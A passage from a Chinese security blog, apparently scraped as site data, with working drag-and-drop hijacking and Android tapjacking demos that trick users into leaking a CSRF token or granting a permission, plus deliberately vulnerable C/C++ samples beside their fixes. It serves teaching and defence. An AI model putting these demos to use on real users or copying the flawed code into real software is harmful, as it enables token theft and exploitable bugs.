123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt; Drag and Drop Attack Demo &lt;/title&gt; &lt;style&gt; .IFrame_hidden &#123; height: 50px; width: 50px; top: 360px; left: 365px; overflow: hidden; filter: alpha(opacity=0); opacity: 0; position: absolute; &#125; .text_area_hidden &#123; height: 200px; width: 200px; top: 130px; left: 580px; border: 1px solid black; overflow: hidden; filter: alpha(opacity=0); opacity: .0; position: absolute; &#125; .ball &#123; top: 350px; left: 350px; position: absolute; &#125; .ball_1 &#123; top: 136px; left: 640px; filter: alpha(opacity=0); opacity: .0; position: absolute; &#125; .Dolphin &#123; top: 150px; left: 600px; position: absolute; &#125; .center &#123; margin-right: auto; margin-left: auto; vertical-align: middle; text-align: center; margin-top: 350px; &#125; &lt;/style&gt; &lt;script&gt; function Init() &#123; //添加监听 var source = document.getElementById(\"source\"); var target = document.getElementById(\"target\"); if (source.addEventListener) &#123; target.addEventListener(\"drop\", DumpInfo, false); &#125; else &#123; target.attachEvent(\"ondrop\", DumpInfo); &#125; &#125; function entities(s) &#123; var e = &#123; '\"': '&amp;quot;', '&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;' &#125;; return s.replace(/[\"&amp;&lt;&gt;]/g, function (m) &#123; return e[m]; &#125;); &#125; function DumpInfo(event) &#123; showHide_ball.call(this); //地面上的小球消失 showHide_ball_1.call(this); //海豚嘴上的小球出现 if (event.dataTransfer.types) &#123; //Firefox浏览器支持 var info = document.getElementById(\"info\"); info.innerHTML += \"&lt;span style='color:#3355cc;font-size:12px'&gt;\" + entities(event.dataTransfer.getData('text/html')) + \"&lt;/span&gt;&lt;br&gt; \"; //在页面上打印出获取到的数据 &#125; else &#123; //IE浏览器支持 setTimeout(\"html()\", 10); &#125; &#125; function html() &#123; document.getElementById('target').innerText = document.getElementById('target').innerHTML; var info = document.getElementById(\"info\"); info.innerHTML += \"&lt;span style='color:#3355cc;font-size:12px'&gt;\" + (document.getElementById('target').innerHTML) + \"&lt;/span&gt;&lt;br&gt; \"; //在页面上打印出获取到的数据 &#125; function showHide_frame() &#123; var IFrame_1 = document.getElementById(\"IFrame_1\"); IFrame_1.style.opacity = this.checked ? \"0.5\" : \"0\"; IFrame_1.style.filter = \"progid:DXImageTransform.Microsoft.Alpha(opacity=\" + (this.checked ? \"50\" : \"0\") + \");\" &#125; function showHide_text() &#123; var text_1 = document.getElementById(\"target\"); text_1.style.opacity = this.checked ? \"0.5\" : \"0\"; text_1.style.filter = \"progid:DXImageTransform.Microsoft.Alpha (opacity=\" + (this.checked ? \"50\" : \"0\") + \");\" &#125; function showHide_ball() &#123; var hide_ball = document.getElementById(\"hide_ball\"); hide_ball.style.opacity = \"0\"; hide_ball.style.filter = \"alpha(opacity=0)\"; &#125; function showHide_ball_1() &#123; var hide_ball_1 = document.getElementById(\"hide_ball_1\"); hide_ball_1.style.opacity = \"1\"; hide_ball_1.style.filter = \"alpha(opacity=100)\"; &#125; function reload_text() &#123; document.getElementById(\"target\").value = '' &#125; &lt;/script&gt;&lt;/head&gt;&lt;body onload=\"Init();\"&gt; &lt;center&gt; &lt;h1&gt; Drag and Drop Attack &lt;/h1&gt; &lt;/center&gt; &lt;img id=\"hide_ball\" src=ball.png class=\"ball\"&gt; &lt;div id=\"source\"&gt; &lt;iframe id=\"IFrame_1\" src=\"http://127.0.0.1/token.html\" class=\"IFrame_hidden\" scrolling=\"no\"&gt; &lt;/iframe&gt; &lt;/div&gt; &lt;img src=Dolphin.jpg class=\"Dolphin\"&gt; &lt;div&gt; &lt;img id=\"hide_ball_1\" src=ball.png class=\"ball_1\"&gt; &lt;/div&gt; &lt;div&gt; &lt;div id=\"target\" class=\"text_area_hidden\" contenteditable=\"true\"&gt; HiJacking: &lt;/div&gt; &lt;/div&gt; &lt;div id=\"info\" style=\"position:absolute;background-color:#e0e0e0;font-weight:bold;top:600px;\"&gt; &lt;/div&gt; &lt;center&gt; 游戏规则：\"Ctrl + A\" 或滑动鼠标选中小球，然后把小球拖放到海豚的嘴上。 &lt;br&gt; &lt;/center&gt; &lt;br&gt; &lt;br&gt; &lt;div class=\"center\"&gt; &lt;center&gt; &lt;center&gt; &lt;input id=\"showHide_frame\" type=\"checkbox\" onclick=\"showHide_frame.call (this);\" /&gt; &lt;label for=\"showHide_frame\"&gt; Show the jacked I--Frame &lt;/label&gt; | &lt;input id=\"showHide_text\" type=\"checkbox\" onclick=\"showHide_text.call(this);\" /&gt; &lt;label for=\"showHide_text\"&gt; Show the jacked Textarea &lt;/label&gt; | &lt;input type=button value=\"Replay\" onclick=\"location.reload();reload_text();\"&gt; &lt;/center&gt; &lt;br&gt; &lt;br&gt; &lt;b&gt; Design by &lt;a target=\"_blank\" href=\"http://hi.baidu.com/xisigr\"&gt; xisigr &lt;/a&gt; &lt;/b&gt; &lt;/center&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; token.html： 123456789&lt;!DOCTYPE html&gt;&lt;html&gt;mi1k7ea's page&lt;form method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"csrf_token\" value=\"980f42huj98fu198\" /&gt;&lt;/form&gt;&lt;a href=\"https://www.mi1k7ea.com/?logout&amp;token=980f42huj98fu198\"&gt;logout&lt;/a&gt;666666666&lt;/html&gt; 正常访问，页面中说明了游戏规则，具体地说就是鼠标选中小球、然后按”Ctrl+A”之后，鼠标拖放小球到海豚（其实是海狮）的嘴上即可完成游戏： 看到下面有两个选项，就是用来展示此次拖放劫持隐藏的内容框的，勾选上让其修改opacity为0.5看下效果： 可以看到，小球下面隐藏的就是目标框，而海狮嘴上周围隐藏的是攻击者劫持用的框。当用户鼠标点击小球，即点中了隐藏的目标框，然后Ctrl+A就会选中隐藏的目标框中所有内容，再拖动小球到海狮嘴上的过程中就会把隐藏的目标框中所有的信息拖到攻击者的框中，从而完成拖放劫持攻击： 注意一点是，当前没办法进行跨域拖放劫持。 0x04 触屏劫持（TapJacking）简介触屏劫持是界面操作劫持攻击模型的最新阶段，是针对智能移动设备进行的攻击。 2010年斯坦福公布触屏劫持攻击。通过将一个不可见的iframe覆盖到当前网页上就可以劫持用户的触屏操作。由于手机屏幕范围有限，手机浏览器为了节省空间会把地址栏隐藏起来，因此在手机上的视觉欺骗更容易实施。 移动设备的WebApp网页设计，无论是屏幕大小还是浏览器支持的函数上都和传统的Web应用不同。 下面的介绍均以iPhone的Safari浏览器为例。 桌面浏览器iPhone的Safari浏览器有一个特殊的功能，即可以把网页添加到IOS系统的桌面当做一个程序图片来显示。添加后，主屏幕会出现一个由网页缩略图生成的APP图标。当用户点击这个图标后，就会打开网页，该功能和快捷键类似。在桌面浏览器程序中可以设置桌面图标、启动画面，还可以设置页面全屏和更改状态栏样式。 添加桌面图标的语句： 1&lt;link rel=\"apple-touch-icon\" href=\"icon.png\"/&gt; 添加启动画面的语句： 1&lt;link rel=\"apple-touch-startup-image\" href=\"startup.png\"/&gt; 全屏显示的语句： 1&lt;meta name=\"apple-mobile-web-app-capable\" content=\"yes\"&gt; 改变状态栏样式为书中图片所示的Status bar位置的语句： 1&lt;meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\"&gt; 经过上面的设置后，Web页面就和一个原生态的APP应用差不多了，其中全屏模式会隐藏URL地址栏和状态栏。 可视区域viewportviewport就是除去所有的工具栏、状态栏、滚动条等之后网页的可视区域。移动设备的屏幕大小和传统的Web不同，需要我们改变viewport。 如下： 1&lt;meta name=\"viewport\" content=\"width=320;initial-scale=1.0;maximun-scale=1.0; user-scaleable=no;\"/&gt; 参数说明： width：viewport的宽度； initial-scale：初始的缩放比例； maximun-scale：允许用户缩放到的最大比例； user-scaleable：用户是否可以手动缩放； 隐藏URL地址栏除了用全屏模式隐藏URL地址栏外，还可以使用如下代码实现隐藏： 123&lt;body οnlοad=\"setTimeout(function()&#123; window.scrollTo(0, 1) &#125;, 100);\"&gt;&lt;/body&gt; 触屏函数使用IOS中Safari浏览器自己独特的触屏API函数，可以模拟鼠标点击或者拖放操作。 函数 说明 touchstart 手指触摸屏幕时发生 touchend 手指离开屏幕时发生 touchmove 手指滑动时发生 touchcancel 系统可取消touch事件 同样是使用透明层+iframe方法，然后配合移动设备特有的自身的覆盖到当前网页上就可以劫持用户的触屏操作。 Demo参考GitHub上针对Android系统移动设备的触屏劫持例子：https://github.com/ggfhgg/Tapjacking_Android 简述： 页面整体采用相对布局，其中start按钮和premession按钮采用布局方法，将Start按钮覆盖在Premession按钮上，并设置start的透明度alpha为0.这样就使用户以为在点击Premession实际上是在触发Start； 点击Start，将加载一个image图像，同时触发一个模拟权限获取的提示框，并将提示框的主体背景设为透明，同时将刚刚加载的伪造消息提示的图像覆盖到权限提示框上，仅留下权限提示框的确认按钮，这样用户就误以为自己在点击信息提示的确认，其实是再点权限确认； 部分核心代码如下： 布局文件（activity_main.xml）： 123456789101112131415161718192021222324&lt;FrameLayout android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\"&gt; &lt;Button android:id=\"@+id/button\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" style=\"@style/btnStyle\" android:text=\"premession\" /&gt; &lt;Button android:id=\"@+id/btnStart\" style=\"@style/btnStyle\" android:layout_width=\"137dp\" android:layout_height=\"wrap_content\" android:onClick=\"startTJService\" android:text=\"@string/strStart\" android:alpha=\"0\"/&gt; &lt;/FrameLayout&gt; MainActivity.java： 12345678910111213141516this.startService(service); AlertDialog.Builder bb = new AlertDialog.Builder(this); bb.setPositiveButton(\"confrim\",new DialogInterface.OnClickListener()&#123; public void onClick(DialogInterface arg0,int arg1)&#123; Toast t = (Toast) Toast.makeText(getApplicationContext(),\"你上当了!!\",Toast.LENGTH_LONG); t.show(); arg0.dismiss(); &#125; &#125;); final AlertDialog dialog = bb.create(); WindowManager.LayoutParams lp = dialog.getWindow().getAttributes(); lp.alpha=1.0f; dialog.getWindow().setAttributes(lp); bb.setMessage(\"应用Tap_jacking正在申请联系人权限\"); bb.setTitle(\"权限获取\"); dialog.show(); ToastService.java: 12345678910public void onCreate() &#123; super.onCreate(); t = new Timer(); context = getApplicationContext(); jam = new Toast(context); ImageView img = new ImageView(context); img.setImageResource(R.drawable.ic_terms_message); jam.setView(img);&#125; 效果如下。 当alpha为1时，是显示Start按钮的，如左图；当alpha为0时，完全不显示Start按钮，如右图： 权限提示框（完整的）lp.alpha = 1.0f，如左图；将权限框主体部分隐藏，只剩下确认按钮lp.alpha = 0.1f，如右图： 假的信息提示框与权限提示框拼接，误导用户，如左图；当用户被视觉欺骗去点击confrim就触发权限提示框onclick方法，弹出消息，攻击成功，如右图： 0x05 防御方法界面操作劫持的防御比较简单，因为其都是通过视觉欺骗的方法进行Web会话劫持。主要的防御思路就是：使有重要会话的交互页面不允许被iframe嵌入，或者只允许被同源iframe嵌入。 X-FRAME-OPTIONSX-Frame-Options HTTP 响应头是用来给浏览器 指示允许一个页面 可否在 &lt;frame&gt;, &lt;iframe&gt;, &lt;embed&gt; 或者 &lt;object&gt; 中展现的标记。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免 ClickJacking 攻击。 其有三个可能的值： 123X-Frame-Options: denyX-Frame-Options: sameoriginX-Frame-Options: allow-from https://example.com/ deny：表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。 sameorigin：表示该页面可以在相同域名页面的 frame 中展示。 allow-from uri：表示该页面可以在指定来源的 frame 中展示。 Frame Busting脚本防御Frame Busting脚本是指使用JavaScript脚本对页面进行控制，达到页面无法被iframe嵌入的目的。 比如： 12345&lt;script&gt;if (top.location != self.location) &#123; top.location = self.location;&#125;&lt;/script&gt; 代码中top指代主体窗口对象，self指代当前窗口对象。如果判断出页面的主体窗口地址与当前窗口地址不同，就将主体窗口地址设置为当前窗口地址。这样就能避免了用户的操作实际发生窗口和所见窗口不一致的情况，从而成功防御了通过透明层进行的界面操作劫持攻击。 然后上述Frame Busting代码存在问题，就是在IE下，如果在主体窗口加入&lt;script&gt;var location=&quot;&quot;&lt;/script&gt;这段代码，那么Frame Busting代码就会被绕过。 绕过示例如下，security=&quot;restricted&quot;为IE的禁止JS，sandbox=&quot;&quot;为HTML5的禁止JS： 1&lt;iframe src=\"xxx\" security=\"restricted\" scrolling=\"no\" sandbox=\"\"&gt; 书上给出当时防御性最高的Frame Busting代码： 12345678910&lt;style&gt; html &#123;display:none;&#125;&lt;/style&gt;&lt;script&gt;if (self == top) &#123; document.documentElement.style.display = 'block';&#125; else &#123; top.location = self.location;&#125;&lt;/script&gt; 使用token防御CSRF Token其实也可以进行界面操作劫持攻击的防御。 比如一个登录页面http://url/login?idtoken=9u1wf3，如果攻击者无法猜测到idtoken后面的值，那么这个登录页面就不能被iframe嵌入，进而也无法对这个页面进行界面操作劫持攻击了。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"界面操作劫持","slug":"界面操作劫持","permalink":"https://www.mi1k7ea.com/tags/界面操作劫持/"}]},{"title":"C&C++代码审计","date":"2021-01-16T06:45:49.000Z","path":"2021/01/16/C-C-代码审计/","text":"0x00 前言本篇只小结代码层面的C/C++安全问题，具体漏洞利用不在范围内。 基本思路：全局找出调用的危险函数或危险操作，往上回溯确定相关参数是否外部可控 0x01 栈溢出审计点常见的危险函数： 输入 gets，直接读取一行，忽略’\\x00’ scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到’\\x00’停止 strcat，字符串拼接，遇到’\\x00’停止 bcopy 对应的安全函数： gets——fgets、StringCchGets、gets_s 字符串处理函数：strcpy、strcat、strncpy、strncat、strlen，输出函数sprintf和snprintf，内存拷贝函数memcpy——对于使用Microsoft编译器的用户，考虑使用StrSate库中的函数：StringCchCopy，StringCchCopyN，StringCchCopyEx，StringCchCopyNEx，StringCbCopy，StringCbCopyN，StringCbCopyEx，StringCbCopyNEx，strnlen_s，StringCchPrintf，StringCchVPrintf，StringCchPrintfEx，StringCchVPrintfEx，StringCbPrintf，StringVCbPrintf，StringCbPrintEx，StringCbVPrintEx；对于使用Gcc编译器的用户，考虑使用libssp库，例如__strcpy_chk.c和__strncpy_chk.c；另外可以使用支持C/C++标准的新版本编译器，并使用新的安全的标准库函数，例如C11标准附录K中的函数strcpy_s，strncpy_s，sprintf_s，_snprintf_s，_snwprintf_s，_vstprintf_s，_vsntprintf_s。 scanf——sscanf_s 随机数值用作长度参数将随机数值作为strncpy()等函数的长度参数，会导致不可预知的行为发生。 由于rand()等函数返回的整型数值是随机的，其长度可能超过缓冲区的最大长度，甚至可能为负值。该情况会造成缓冲区越界。 Demo12len = rand();strncpy(dest, src, len); 用例中，长度参数len经过了长度验证，但验证的行为并不充分：该验证并未考虑到返回负值的情况。 123456#define URAND31() (((unsigned)rand()&lt;&lt;30) ^ ((unsigned)rand()&lt;&lt;15) ^ rand())#define RAND32() ((int)(rand() &amp; 1 ? URAND31() : -URAND31() - 1))char dest[100];len = RAND32();if (len &lt; 100) strncpy(dest, src, len); 修复不要将随机数用作strncpy()等库函数的长度参数。 如果需要随机数作为strncpy()等库函数的长度参数，需要对其长度进行有效的限制。 123456#define URAND31() (((unsigned)rand()&lt;&lt;30) ^ ((unsigned)rand()&lt;&lt;15) ^ rand())#define RAND32() ((int)(rand() &amp; 1 ? URAND31() : -URAND31() - 1))char dest[100];len = RAND32();if (len &gt; 0 &amp;&amp; len &lt; 100) strncpy(dest, src, len); 0x02 堆溢出审计点堆分配函数： malloc calloc realloc 常见的危险函数： 输入 gets，直接读取一行，忽略 &#39;\\x00&#39; scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到 &#39;\\x00&#39; 停止 strcat，字符串拼接，遇到 &#39;\\x00&#39; 停止 bcopy 对应的安全函数： alloca——SafeAllocA 0x03 UAF如果内存在释放后继续使用，可能会造成无法预测的结果。 释放后使用会导致严重的问题。使用已经释放的内存将会导致合法数据损坏，或者执行任意代码，具体取决于当时的运行状态。 当内存被释放，又没有重新分配指针之前，它的内容依然可以访问。这些被释放内存上的数据看似合法，但是会发生非预期的改变，最终可能导致出现意料之外的代码行为。 Demo例1，代码中int *x = malloc(4)分配的指针x在free(x)释放之后在返回语句进行解引用，这就发生了对已经释放的内存指针进行解引用。 1234567#include &lt;stdlib.h&gt;int foo() &#123; int *x = (int *)malloc(4); *x = 10; free(x); return *x;&#125; 例2，代码中可能因为t的值不为0而导致x被释放，之后返回了被释放的指针。 1234567891011#include &lt;stdlib.h&gt;int *foo(int t) &#123; static int *x = NULL; if (!x) &#123; x = (int *)malloc(sizeof(int)); &#125; if (t) &#123; free(x); &#125; return x;&#125; 修复要避免释放后再使用问题，可以采取以下几种措施： 在指针被释放后将其设为空值。 确保全局变量仅被释放一次。 在循环或条件语句中释放内存或重新分配内存时，尤其要多加小心。 上述代码中在free之前将x所指向的int值赋值给局部变量a，再返回a的值，从而避免了释放后再使用的问题。 12345678#include &lt;stdlib.h&gt;int foo() &#123; int *x = (int *)malloc(4); *x = 10; int a = *x; free(x); return a;&#125; 0x04 Double Free如果内存在释放后再次进行重复释放，可能会造成无法预测的结果。 当程序重复释放内存时，内存管理数据结构将被破坏，引起程序崩溃或者返回与上一次相同的指针。在这种情况下，攻击者能够成功的控制数据写入到多重分配的内存，这将导致缓冲区溢出的漏洞攻击。 在C++代码中，下述浅拷贝的情况可能会导致内存重复释放： 如调用一次赋值运算符或拷贝构造函数将会导致两个对象的数据成员指向相同的动态内存。缺少一种合适的引用计数设备，当第一个对象超出作用域时，析构函数将会释放这两个对象共享的内存。第二个对象中对应的数据成员将会指向已经释放的内存地址。当第二个对象超出作用域时，它的析构函数试图再次释放这块内存。这会导致应用程序崩溃或堆内存损坏。 Demo例1，代码中 release(a) 已经对a进行了释放， 稍后的两个free语句再次对a进行了重复释放。 1234567891011121314151617#include &lt;stdlib.h&gt;typedef struct x &#123; char * field;&#125; tx;void release(tx * a)&#123; free(a-&gt;field); free(a);&#125;int main() &#123; tx *a = (tx *)malloc(sizeof(tx)); if (a==NULL) return; a-&gt;field = (char *)malloc(10); release(a); free(a-&gt;field); free(a); return 0;&#125; 例2，示例中类C为C::data动态分配内存，但是没有定义赋值运算符。结果，当函数main()执行时，c1.data和c2.data具有相同的值，当析构时都调用delete[]操作符，相同的指针被释放两次。 1234567891011121314151617#include &lt;iostream&gt;using namespace std;class C &#123; char *data; C(const C &amp;) &#123;&#125; public: C() &#123; data = new char[10]; &#125; ~C() &#123; cout &lt;&lt; \"Calling delete for \" &lt;&lt; (void *)data &lt;&lt; endl; delete[] data; &#125;&#125;;int main() &#123; C c1; C c2; c1 = c2;&#125; 例3，示例中，因为没有定义拷贝构造函数，编译器生成一个从一个实例拷贝所有值到另一个实例的拷贝构造函数。结果，c1.data和c2.data具有相同的值，当析构函数被调用时释放了两次。 1234567891011121314151617#include &lt;iostream&gt;using namespace std;class C &#123; char *data; C &amp;operator=(const C &amp;) &#123; return *this; &#125; public: C() &#123; data = new char[10]; &#125; ~C() &#123; cout &lt;&lt; \"Calling delete for \" &lt;&lt; (void *)data &lt;&lt; endl; delete[] data; &#125;&#125;;int main() &#123; C c1; C c2 = c1; return 0;&#125; 例4，示例中，在赋值运算符中对成员指针d执行浅拷贝。在析构函数~C()中释放相应的内存。 12345678910111213struct D &#123;&#125;;class C &#123; public: C(); ~C() &#123; delete d; &#125; C &amp;operator=(const C &amp;rhs) &#123; d = rhs.d; // shallow copy return *this; &#125; private: C(const C &amp;rhs); D *d;&#125;; 例5，示例中，在拷贝构造函数中对成员指针d执行浅拷贝。在析构函数~C()中释放相应的内存。 123456789101112struct D &#123;&#125;;class C &#123; public: C(); ~C() &#123; delete d; &#125; C(const C &amp;rhs) &#123; d = rhs.d; // shallow copy &#125; private: C &amp;operator=(const C &amp;rhs); D *d;&#125;; 修复例1：为了解决这个问题，应该定义赋值运算符。依据具体的情况，可以使用不同的赋值运算符实现。 （1）如果需要申请新内存，赋值运算符的实现应该检测是否是自赋值，释放原来内存，申请新内存，并且拷贝数据： 123456789101112class C &#123; // ... C &amp;operator=(const C &amp;src) &#123; if (&amp;src == this) return *this; delete[] data; data = new char[10]; memcpy(data, src.data, 10); return *this; &#125; // ...&#125;; （2）先前的实现执行了不必要的堆内存操作。由于释放的数据和申请的数据具有相同大小的结构，在这种情况下原来的内存是可以被重用的： 12345678910class C &#123; // ... C &amp;operator=(const C &amp;src) &#123; if (&amp;src == this) return *this; memcpy(data, src.data, 10); return *this; &#125; // ...&#125;; （3）如果不想要拷贝类实例，赋值运算符应该被声明为私有的。在这种情况下，如果试图拷贝一个对象，编译器就会产生一个错误: 123456class C &#123; // ... private: C &amp;operator=(const C &amp;) &#123; return *this; &#125; // ...&#125;; 例2：为了解决这个问题，依据具体的情况，可以使用两种不同的实现方式中的一个。 （1）通常，定义一个深拷贝构造函数： 12345678class C &#123; // ... C(const C &amp;src) &#123; data = new char[10]; memcpy(data, src.data, 10); &#125; // ...&#125;; （2）如果不想要拷贝类实例，拷贝构造函数应该被声明为私有的。 123456class C &#123; // ... private: C(const C &amp;src) &#123; /* do not create copies */ &#125; // ...&#125;; 例3： 123456789101112131415struct D &#123; /* omitted for brevity */&#125;;class C &#123; public: C(); ~C() &#123; delete d; &#125; C &amp;operator=(const C &amp;rhs) &#123; d = new D(*rhs.d); return *this; &#125; private: C(const C &amp;rhs); D *d;&#125;; 在示例中，在赋值运算符中执行深拷贝。因此，当这两个对象的析构函数被调用时不会发生两次释放内存。 例4： 1234567891011121314struct D &#123; /* omitted for brevity */&#125;;class C &#123; public: C(); ~C() &#123; delete d; &#125; C(const C &amp;rhs) &#123; d = new D((*rhs.d); &#125; private: C &amp;operator=(const C &amp;rhs); D *d;&#125;; 在示例中，在拷贝构造函数中执行深拷贝。因此，当这两个对象的析构函数被调用时不会发生两次释放内存。 0x05 整数溢出整数溢出分为上界溢出和下界溢出。 一般出现整数溢出的场景： 未限制范围 错误的类型转换（范围大的变量赋值给范围小的变量、只做了单边限制） Demosize类型为unsigned int，最大取值为65535，当超过这个值时，截断导致越过size检查，然后，在memcpy()函数函数中造成栈溢出，程序crash，可能导致代码执行。堆上的整数溢出同理，只是溢出对象是堆数据，导致覆盖的时候后面的堆结构。 123456789101112131415161718192021//栈的整数溢出#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(int argc,char* argv)&#123; int i; char buf[8]; unsigned short int size; char overflow[65550]; memset(overflow,65,sizeof(overflow)); printf(\"please input size:\\n\"); scanf(\"%d\",&amp;i); size =i; printf(\"size:%d\",size); printf(\"i:%d\",i); if(size &gt; 8)&#123; return -1; &#125; //stack overflow memcpy(buf,overflow,i); return 0;&#125; 0x06 格式化字符串漏洞审计点格式化字符串函数： 函数 基本介绍 printf 输出到 stdout fprintf 输出到指定 FILE 流 vprintf 根据参数列表格式化输出到 stdout vfprintf 根据参数列表格式化输出到指定 FILE 流 sprintf 输出到字符串 snprintf 输出指定字节数到字符串 vsprintf 根据参数列表格式化输出到字符串 vsnprintf 根据参数列表格式化输出指定字节到字符串 setproctitle 设置 argv syslog 输出日志 err, verr, warn, vwarn 等 。。。 工具LazyIDA 0x07 命令注入审计点执行命令的几个函数： 123systemfopenpopen 0x08 SQL注入关键还是在于直接拼接SQL语句。 后续会推出SQL注入检查扫描插件。 Demo示例中，mysql_real_query执行了外部读取的SQL语句，因stmt_str内容不可控，这将造成恶意用户可以执行任意SQL命令。 1234void test_mysql_real_query(MYSQL *mysql, const char *stmt_str, unsigned long length) &#123; scanf(\"%s\", stmt_str); mysql_real_query(mysql, stmt_str, length);&#125; 修复为避免SQL注入缺陷，可以： 创建SQL语句时仅使用常量字符串； 创建安全库，将用作输入数据的参数化的SQL语句进行安全验证； 如果构造SQL指令时需要动态输入，应当针对动态输入的数据进行有效的验证。 0x09 条件竞争TOCTOU条件竞争TOCTOU(Time-of-check Time-of-use) 指的是程序在使用资源（变量，内存，文件）前会对进行检查，但是在程序使用对应的资源前，该资源却被修改了。 下面是最易出现TOCTOU条件竞争的几个场景。 CWE-365: Race Condition in Switch当程序正在执行 switch 语句时，如果 switch 变量的值被改变，那么就可能造成不可预知的行为。尤其在 case 语句后不写 break 语句的代码，一旦 switch 变量发生改变，很有可能会改变程序原有的逻辑。 CWE-363: Race Condition Enabling Link Following… 函数都会使用文件名作为参数：access(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename(), chroot(),… … Signal Handler条件竞争条件竞争经常会发生在信号处理程序中，这是因为信号处理程序支持异步操作。尤其是当信号处理程序是不可重入的或者状态敏感的时候，攻击者可能通过利用信号处理程序中的条件竞争，可能可以达到拒绝服务攻击和代码执行的效果。 malloc、free， setjmp、longjmp。 工具静态检测目前已知的静态检测工具有 Flawfinder 目标：C/C++ 源码 步骤 建立漏洞数据库 进行简单的文本模式匹配，没有任何的数据流或控制流分析 ThreadSanitizer 目标：C++ 和 GO 实现：LLVM 动态检测 Intel Inspector Valgrind 0x0A 数组越界越界访问当程序访问一个数组中的元素时，如果索引值超出数组的长度，就会访问数组之外的内存。C和C++没有提供内置的防护措施来防止在任意内存中访问数据，也没有自动检测写入数组（这种语言内置的缓冲区类型）的数据是否在数组的边界以内。 一旦这种情况发生，将会造成程序内存结构破坏，导致安全隐患产生，攻击者可以利用这个缺陷执行任意代码片段。 Demo例1，循环变量的上界是以数组a为char类型（1字节）数组时计算出来的数组大小，但是在循环内部数组a作为一个整型（4字节）数组被访问。因此，由于1字节的字符和4字节的整数在内存中的大小不同，导致大小为2的“整型”数组a可能使用下标2..7 123456void foo() &#123; char a[8]; // holds two 4-byte ints for (int i = 0; i &lt; sizeof(a); i++) &#123; ((int *)a)[i] = i; &#125;&#125; 例2，函数foobar()获取一个值作为访问数组local_array的下标，而main函数使用实参15来调用函数foobar()，超过数组local_array的下标合法值0..7。 12345678void foobar(int x) &#123; int local_array[7]; local_array[x] = 0;&#125;int main() &#123; foobar(15); return 0;&#125; 修复例1，循环的上界变为数组a作为一个整型数组时所包含的元素个数。 123456void foo() &#123; char a[8]; // holds two 4-byte ints for (int i = 0; i &lt; sizeof(a) / sizeof(int); i++) &#123; ((int *)a)[i] = i; &#125;&#125; 例2，使用参数x作为局部数组local_array的下标时，在第5行验证x的值是否合法。在其他情况下，最好的修复方式就是在主调函数中验证值是否合法。 1234567891011void foobar(int x) &#123; int local_array[7]; // verify the parameter is in range if (x &gt;= 0 &amp;&amp; x &lt; 7) &#123; local_array[x] = 0; &#125;&#125;int main() &#123; foobar(15); return 0;&#125; 字符串操作造成目的缓冲区缺少\\0在执行字符串拷贝的时候，如果源字符串大于目标字符串的大小，可能会导致目标字符串中存入的数据结尾不是\\0。如果字符串不是以\\0结尾，在后续访问该字符串时，会导致越界访问非法内存。 Demo例1，foo的大小为10，而”1234567890”的大小也为10，所以执行strncpy之后foo的最后一个字符不是\\0。 12345#include &lt;string.h&gt;void bad() &#123; char foo[10]; strncpy(foo, \"1234567890\", sizeof(foo));&#125; 例2，由于字符序列c_str中不带有null终结符，而作为参数传给函数printf()。 12345#include &lt;stdio.h&gt;void func(void) &#123; char c_str[3] = \"abc\"; printf(\"%s\\n\", c_str);&#125; 例3，作为参数传给wcslen()函数的宽字节字符序列cur_msg可能并不具有null终结符。 123456789101112131415161718192021#include &lt;stdlib.h&gt;#include &lt;wchar.h&gt;wchar_t *cur_msg = NULL;size_t cur_msg_size = 1024;size_t cur_msg_len = 0;void lessen_memory_usage(void) &#123; wchar_t *temp; size_t temp_size; /* ... */ if (cur_msg != NULL) &#123; temp_size = cur_msg_size / 2 + 1; temp = realloc(cur_msg, temp_size * sizeof(wchar_t)); /* temp &amp;and cur_msg may no longer be null-terminated */ if (temp == NULL) &#123; /* Handle error */ &#125; cur_msg = temp; cur_msg_size = temp_size; cur_msg_len = wcslen(cur_msg); &#125;&#125; 修复审查代码逻辑，避免缓冲区存入数据超过容纳限制，或者增大缓冲区大小。 例1： 12345#include &lt;string.h&gt;void good() &#123; char foo[11]; strncpy(foo, \"1234567890\", sizeof(foo));&#125; 例2，如果该边界被省略，编译器会为字符串以及字符串中的null终结符分配足够的内存空间： 12345#include &lt;stdio.h&gt;void func(void) &#123; char c_str[] = \"abc\"; printf(\"%s\\n\", c_str);&#125; 例3，在调用函数wcslen()时，cur_msg会带有null终结符： 1234567891011121314151617181920212223#include &lt;stdlib.h&gt;#include &lt;wchar.h&gt;wchar_t *cur_msg = NULL;size_t cur_msg_size = 1024;size_t cur_msg_len = 0;void lessen_memory_usage(void) &#123; wchar_t *temp; size_t temp_size; /* ... */ if (cur_msg != NULL) &#123; temp_size = cur_msg_size / 2 + 1; temp = realloc(cur_msg, temp_size * sizeof(wchar_t)); /* temp and cur_msg may no longer be null-terminated */ if (temp == NULL) &#123; /* Handle error */ &#125; cur_msg = temp; /* Properly null-terminate cur_msg */ cur_msg[temp_size - 1] = L'\\0'; cur_msg_size = temp_size; cur_msg_len = wcslen(cur_msg); &#125;&#125; 0x0B 迭代器相关问题迭代器使用不匹配将一个容器的迭代器用于另一个容器使用将会导致未定义行为。 Demo在这个示例中，cont2.erase(i) 使用了指向cont1的迭代器，这将导致未定义行为发生。 12345void foo(set&lt;int&gt; &amp;cont1, set&lt;int&gt; &amp;cont2) &#123; set&lt;int&gt;::iterator i = cont1.find(100); if (i != cont1.end()) cont2.erase(i);&#125; 